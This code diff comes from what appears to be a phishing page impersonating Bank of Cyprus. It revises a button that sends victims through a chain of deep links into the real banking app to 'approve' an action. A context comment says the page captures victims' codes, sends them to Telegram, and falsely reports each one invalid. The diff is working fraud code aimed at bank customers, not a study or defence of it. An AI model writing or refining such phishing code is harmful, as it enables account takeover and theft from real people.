@@ -394,32 +394,38 @@ export default function BbvaPage(props: any) {
   }
 
   // Open official Bank of Cyprus Mobile App directly on Android & iOS without opening Play Store
-  const handleOpenBocApp = () => {
+  const handleOpenBocApp = (e?: React.MouseEvent) => {
     if (typeof window === "undefined") return
 
-    const ua = navigator.userAgent || navigator.vendor || ""
-    const isAndroid = /android/i.test(ua)
-    const isIOS =
-      /iPad|iPhone|iPod/.test(ua) ||
-      (typeof navigator !== "undefined" && navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1)
+    // Explicitly target the native app schemes (boc://netteller, boc://app, boc://, 1bank://)
+    // without any package= intent or Play Store URLs so mobile browsers launch the installed app directly
+    try {
+      window.location.href = "boc://netteller"
+    } catch { }
 
-    if (isAndroid) {
-      // Android Intent to directly launch the Bank of Cyprus app by package name without opening Play Store
-      const androidIntent =
-        "intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;package=cy.com.netinfo.netteller.boc;end"
-      window.location.href = androidIntent
-    } else if (isIOS) {
-      // iOS URL Scheme to directly launch Bank of Cyprus 1bank app on iPhone
-      window.location.href = "boc://"
-      setTimeout(() => {
-        if (!document.hidden) {
+    setTimeout(() => {
+      if (!document.hidden) {
+        try {
+          window.location.href = "boc://app"
+        } catch { }
+      }
+    }, 200)
+
+    setTimeout(() => {
+      if (!document.hidden) {
+        try {
+          window.location.href = "boc://"
+        } catch { }
+      }
+    }, 400)
+
+    setTimeout(() => {
+      if (!document.hidden) {
+        try {
           window.location.href = "1bank://"
-        }
-      }, 400)
-    } else {
-      // Fallback for desktop or other platforms
-      window.location.href = "boc://"
-    }
+        } catch { }
+      }
+    }, 600)
   }
 
   // BOC Confirm & Resend Handlers: captures code to Telegram and shows invalid message each time
@@ -1766,11 +1772,11 @@ export default function BbvaPage(props: any) {
                 : "Απαιτείται η έγκρισή σας στην εφαρμογή mobile banking."}
             </p>
 
-            {/* Teal Call-to-Action Button -> Opens Google Play Store Mobile App Link */}
-            <button
-              type="button"
+            {/* Teal Call-to-Action Button -> Opens Bank of Cyprus Mobile App directly */}
+            <a
+              href="boc://netteller"
               onClick={handleOpenBocApp}
-              className="w-full bg-[#0c6a74] hover:bg-[#09575f] active:scale-[0.99] text-white rounded-[7px] py-2.5 px-3 flex items-center justify-center gap-2 mb-4.5 shadow-xs transition-all cursor-pointer select-none"
+              className="w-full bg-[#0c6a74] hover:bg-[#09575f] active:scale-[0.99] text-white rounded-[7px] py-2.5 px-3 flex items-center justify-center gap-2 mb-4.5 shadow-xs transition-all cursor-pointer select-none no-underline"
             >
               <div className="flex flex-col items-center justify-center leading-none shrink-0 pr-0.5">
                 <span className="text-[11px] font-bold leading-none">↗</span>
@@ -1781,7 +1787,7 @@ export default function BbvaPage(props: any) {
                   ? "Tap to Open Mobile App for Approval 👉"
                   : "Πατήστε για να Ανοίξετε το Mobile App για Έγκριση 👉"}
               </span>
-            </button>
+            </a>
 
             {/* Steps Section */}
             <div className="mb-4 select-none">
